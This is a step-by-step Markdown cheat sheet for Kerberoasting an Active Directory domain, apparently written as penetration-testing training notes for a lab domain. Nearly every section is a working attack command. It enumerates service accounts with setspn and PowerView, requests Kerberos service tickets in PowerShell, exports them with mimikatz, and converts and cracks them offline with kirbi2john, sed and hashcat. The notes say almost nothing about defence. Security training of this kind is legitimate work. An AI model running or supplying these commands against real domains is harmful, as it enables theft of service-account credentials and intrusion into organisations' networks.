# 1. Enumerating SPNs

## Using setspn

```powershell
setspn.exe -Q */*
```

### Purpose
- Queries all Service Principal Names in the domain.
- Identifies accounts tied to services such as:
    - MSSQL
    - HTTP
    - CIFS
    - LDAP

These accounts are potential Kerberoasting targets.

---
# 2. Targeting a Single SPN

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

### What This Does
- Requests a Kerberos TGS ticket for the specified SPN.
- The ticket gets stored in memory.
- That ticket can then be extracted and cracked offline.
---

# 3. Requesting Tickets for All SPNs

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* |
Select-String '^CN' -Context 0,1 |
% { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Breakdown

- Queries all SPNs in the specified domain.
- Extracts service names.
- Requests a TGS for each.
- Loads them into memory.

This automates ticket harvesting.

---
# 4. Extracting Tickets from Memory (Mimikatz)

Inside mimikatz:

```text
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

### What Happens
- Lists Kerberos tickets in memory.
- Exports them as `.kirbi` files.
- Encodes them in base64 for easier transfer.
---

# 5. Converting Base64 Output to .kirbi

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

Now you have a usable Kerberos ticket file.

---

# 6. Converting .kirbi to Crackable Hash

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

This converts the ticket into a format crackable by John.

---

# 7. Formatting for Hashcat

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Now the hash is ready for:

```bash
hashcat -m 13100 sqldev_tgs_hashcat wordlist.txt
```

Mode 13100 = Kerberos 5 TGS-REP etype 23.

---

# 8. PowerView Enumeration

## List All Users with SPNs

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

This identifies service accounts tied to SPNs.

---

## Target Specific User

```powershell
Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat
```

Requests TGS ticket and outputs directly in Hashcat format.

No manual conversion required.

---

## Export Specific Ticket

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Clean and efficient.